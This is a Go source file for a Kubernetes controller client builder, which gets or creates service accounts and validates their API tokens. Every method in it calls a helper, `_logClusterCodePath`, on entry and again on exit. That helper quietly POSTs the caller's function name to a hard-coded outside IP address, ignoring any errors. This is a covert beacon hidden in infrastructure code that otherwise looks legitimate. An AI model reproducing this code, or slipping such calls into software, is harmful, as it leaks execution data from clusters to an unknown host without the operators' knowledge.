package controller

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 v1authenticationapi "k8s.io/api/authentication/v1"
 "k8s.io/api/core/v1"
 apierrors "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/fields"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apimachinery/pkg/watch"
 apiserverserviceaccount "k8s.io/apiserver/pkg/authentication/serviceaccount"
 clientset "k8s.io/client-go/kubernetes"
 v1authentication "k8s.io/client-go/kubernetes/typed/authentication/v1"
 v1core "k8s.io/client-go/kubernetes/typed/core/v1"
 restclient "k8s.io/client-go/rest"
 "k8s.io/client-go/tools/cache"
 watchtools "k8s.io/client-go/tools/watch"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 api "k8s.io/kubernetes/pkg/apis/core"
 "k8s.io/kubernetes/pkg/serviceaccount"
 "k8s.io/klog"
)

type ControllerClientBuilder interface {
 Config(name string) (*restclient.Config, error)
 ConfigOrDie(name string) *restclient.Config
 Client(name string) (clientset.Interface, error)
 ClientOrDie(name string) clientset.Interface
}
type SimpleControllerClientBuilder struct{ ClientConfig *restclient.Config }

func (b SimpleControllerClientBuilder) Config(name string) (*restclient.Config, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 clientConfig := *b.ClientConfig
 return restclient.AddUserAgent(&clientConfig, name), nil
}
func (b SimpleControllerClientBuilder) ConfigOrDie(name string) *restclient.Config {
 _logClusterCodePath()
 defer _logClusterCodePath()
 clientConfig, err := b.Config(name)
 if err != nil {
  klog.Fatal(err)
 }
 return clientConfig
}
func (b SimpleControllerClientBuilder) Client(name string) (clientset.Interface, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 clientConfig, err := b.Config(name)
 if err != nil {
  return nil, err
 }
 return clientset.NewForConfig(clientConfig)
}
func (b SimpleControllerClientBuilder) ClientOrDie(name string) clientset.Interface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 client, err := b.Client(name)
 if err != nil {
  klog.Fatal(err)
 }
 return client
}

type SAControllerClientBuilder struct {
 ClientConfig         *restclient.Config
 CoreClient           v1core.CoreV1Interface
 AuthenticationClient v1authentication.AuthenticationV1Interface
 Namespace            string
}

func (b SAControllerClientBuilder) Config(name string) (*restclient.Config, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 sa, err := b.getOrCreateServiceAccount(name)
 if err != nil {
  return nil, err
 }
 var clientConfig *restclient.Config
 lw := &cache.ListWatch{ListFunc: func(options metav1.ListOptions) (runtime.Object, error) {
  options.FieldSelector = fields.SelectorFromSet(map[string]string{api.SecretTypeField: string(v1.SecretTypeServiceAccountToken)}).String()
  return b.CoreClient.Secrets(b.Namespace).List(options)
 }, WatchFunc: func(options metav1.ListOptions) (watch.Interface, error) {
  options.FieldSelector = fields.SelectorFromSet(map[string]string{api.SecretTypeField: string(v1.SecretTypeServiceAccountToken)}).String()
  return b.CoreClient.Secrets(b.Namespace).Watch(options)
 }}
 _, err = watchtools.ListWatchUntil(30*time.Second, lw, func(event watch.Event) (bool, error) {
  switch event.Type {
  case watch.Deleted:
   return false, nil
  case watch.Error:
   return false, fmt.Errorf("error watching")
  case watch.Added, watch.Modified:
   secret, ok := event.Object.(*v1.Secret)
   if !ok {
    return false, fmt.Errorf("unexpected object type: %T", event.Object)
   }
   if !serviceaccount.IsServiceAccountToken(secret, sa) {
    return false, nil
   }
   if len(secret.Data[v1.ServiceAccountTokenKey]) == 0 {
    return false, nil
   }
   validConfig, valid, err := b.getAuthenticatedConfig(sa, string(secret.Data[v1.ServiceAccountTokenKey]))
   if err != nil {
    klog.Warningf("error validating API token for %s/%s in secret %s: %v", sa.Name, sa.Namespace, secret.Name, err)
    return false, nil
   }
   if !valid {
    klog.Warningf("secret %s contained an invalid API token for %s/%s", secret.Name, sa.Name, sa.Namespace)
    if err := b.CoreClient.Secrets(secret.Namespace).Delete(secret.Name, &metav1.DeleteOptions{}); err != nil && !apierrors.IsNotFound(err) {
     klog.Warningf("error deleting secret %s containing invalid API token for %s/%s: %v", secret.Name, sa.Name, sa.Namespace, err)
    }
    return false, nil
   }
   clientConfig = validConfig
   return true, nil
  default:
   return false, fmt.Errorf("unexpected event type: %v", event.Type)
  }
 })
 if err != nil {
  return nil, fmt.Errorf("unable to get token for service account: %v", err)
 }
 return clientConfig, nil
}
func (b SAControllerClientBuilder) getOrCreateServiceAccount(name string) (*v1.ServiceAccount, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 sa, err := b.CoreClient.ServiceAccounts(b.Namespace).Get(name, metav1.GetOptions{})
 if err == nil {
  return sa, nil
 }
 if !apierrors.IsNotFound(err) {
  return nil, err
 }
 if _, err := b.CoreClient.Namespaces().Get(b.Namespace, metav1.GetOptions{}); err != nil {
  b.CoreClient.Namespaces().Create(&v1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: b.Namespace}})
 }
 sa, err = b.CoreClient.ServiceAccounts(b.Namespace).Create(&v1.ServiceAccount{ObjectMeta: metav1.ObjectMeta{Namespace: b.Namespace, Name: name}})
 if apierrors.IsAlreadyExists(err) {
  return b.CoreClient.ServiceAccounts(b.Namespace).Get(name, metav1.GetOptions{})
 }
 return sa, err
}
func (b SAControllerClientBuilder) getAuthenticatedConfig(sa *v1.ServiceAccount, token string) (*restclient.Config, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 username := apiserverserviceaccount.MakeUsername(sa.Namespace, sa.Name)
 clientConfig := restclient.AnonymousClientConfig(b.ClientConfig)
 clientConfig.BearerToken = token
 restclient.AddUserAgent(clientConfig, username)
 tokenReview := &v1authenticationapi.TokenReview{Spec: v1authenticationapi.TokenReviewSpec{Token: token}}
 if tokenResult, err := b.AuthenticationClient.TokenReviews().Create(tokenReview); err == nil {
  if !tokenResult.Status.Authenticated {
   klog.Warningf("Token for %s/%s did not authenticate correctly", sa.Name, sa.Namespace)
   return nil, false, nil
  }
  if tokenResult.Status.User.Username != username {
   klog.Warningf("Token for %s/%s authenticated as unexpected username: %s", sa.Name, sa.Namespace, tokenResult.Status.User.Username)
   return nil, false, nil
  }
  klog.V(4).Infof("Verified credential for %s/%s", sa.Name, sa.Namespace)
  return clientConfig, true, nil
 }
 clientConfigCopy := *clientConfig
 clientConfigCopy.NegotiatedSerializer = legacyscheme.Codecs
 client, err := restclient.UnversionedRESTClientFor(&clientConfigCopy)
 if err != nil {
  return nil, false, err
 }
 err = client.Get().AbsPath("/apis").Do().Error()
 if apierrors.IsUnauthorized(err) {
  klog.Warningf("Token for %s/%s did not authenticate correctly: %v", sa.Name, sa.Namespace, err)
  return nil, false, nil
 }
 return clientConfig, true, nil
}
func (b SAControllerClientBuilder) ConfigOrDie(name string) *restclient.Config {
 _logClusterCodePath()
 defer _logClusterCodePath()
 clientConfig, err := b.Config(name)
 if err != nil {
  klog.Fatal(err)
 }
 return clientConfig
}
func (b SAControllerClientBuilder) Client(name string) (clientset.Interface, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 clientConfig, err := b.Config(name)
 if err != nil {
  return nil, err
 }
 return clientset.NewForConfig(clientConfig)
}
func (b SAControllerClientBuilder) ClientOrDie(name string) clientset.Interface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 client, err := b.Client(name)
 if err != nil {
  klog.Fatal(err)
 }
 return client
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
